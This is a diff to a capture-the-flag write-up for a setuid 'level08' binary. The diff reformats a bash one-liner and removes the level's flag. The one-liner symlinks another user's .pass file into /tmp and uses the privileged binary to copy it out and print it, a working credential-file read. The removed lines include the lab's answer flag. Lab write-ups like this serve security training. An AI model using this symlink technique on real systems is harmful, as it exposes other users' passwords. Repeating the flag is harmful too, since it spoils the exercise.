@@ -67,14 +67,4 @@ Running from `/tmp/` sidesteps this because /tmp is world-writable and we
 own the directory we create there.
 
 ## One-liner
-
-```bash
-mkdir -p /tmp/x/backups && \
-ln -s /home/users/level09/.pass /tmp/x/p && \
-cd /tmp/x && /home/users/level08/level08 p && \
-cat /tmp/x/backups/p
-```
-
-## Flag
-
-`fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`
+mkdir -p /tmp/x/backups && ln -s /home/users/level09/.pass /tmp/x/p && cd /tmp/x && /home/users/level08/level08 p && cat /tmp/x/backups/p
